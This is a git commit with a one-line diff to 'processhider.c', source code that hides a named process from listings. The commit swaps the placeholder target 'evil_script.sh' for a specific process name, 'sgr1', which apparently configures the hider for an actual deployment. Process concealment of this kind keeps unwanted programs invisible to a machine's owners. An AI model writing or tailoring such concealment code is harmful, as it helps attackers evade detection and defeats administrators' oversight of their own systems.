b2ad29e9605e7d1f00a9f6e228b79e22eca2e61a
suhujetlag5 <143488653+suhujetlag5@users.noreply.github.com>
2023-09-11 14:07:55 +0700

    Update processhider.c

--- processhider.c
+++ processhider.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.sh";
+static const char* process_to_filter = "sgr1";
 
 /*
  * Get a directory name given a DIR* handle
